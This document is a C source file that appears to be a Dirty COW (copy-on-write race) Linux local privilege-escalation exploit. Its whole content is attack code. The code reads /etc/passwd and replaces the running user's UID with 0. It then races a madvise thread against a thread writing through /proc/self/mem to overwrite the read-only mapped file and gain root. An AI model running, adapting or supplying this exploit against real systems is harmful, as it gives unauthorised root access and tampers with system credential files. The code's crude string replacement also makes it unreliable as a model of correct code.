#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include<stdlib.h>
#include<pwd.h>
#include<sys/stat.h>
#define N 15
#define M 2000
 
void *map;
int f;
struct stat st;
char *name;

void replace_string(char *source_str,char *targ_str,char *val)
{
    char temp_sstr[M],result[M];
    char *q,*p;
    int len;len=0;p=q=NULL;
    memset(result,0,sizeof(result));
    memset(temp_sstr,0,sizeof(temp_sstr));
    strcpy(temp_sstr,source_str);
    q=p=temp_sstr;
    len=strlen(targ_str);
    while(q!=NULL)
    {
        if((q=strstr(p,targ_str))!=NULL)
        {
            strncat(result,p,q-p);
            strcat(result,val);
            strcat(result,"\0");
            q+=len;
            p=q;
        }
        else
            strcat(result,p);
    }
    strcpy(source_str,result);
}

void itoa(int i, char *string)
{
    int power,j;
    j=i;
    for(power=1;j>=10;j/=10)
        power*=10;
    for(;power>0;power/=10)
    {
        *string++='0'+i/power;
        i%=power;
    }
    *string='\0';
}

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])   //argv[1]="/etc/passwd"
{ 
  int uid,f;
  char buf[M],suid[N],ss[]="0";
  uid=getuid();
  itoa(uid,suid);
  if (argc<3)return 1;
  pthread_t pth1,pth2;
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  read(f,buf,st.st_size);
  replace_string(buf,suid,ss);
  name=argv[1];
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,buf);
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  close(f);
  return 0;
}
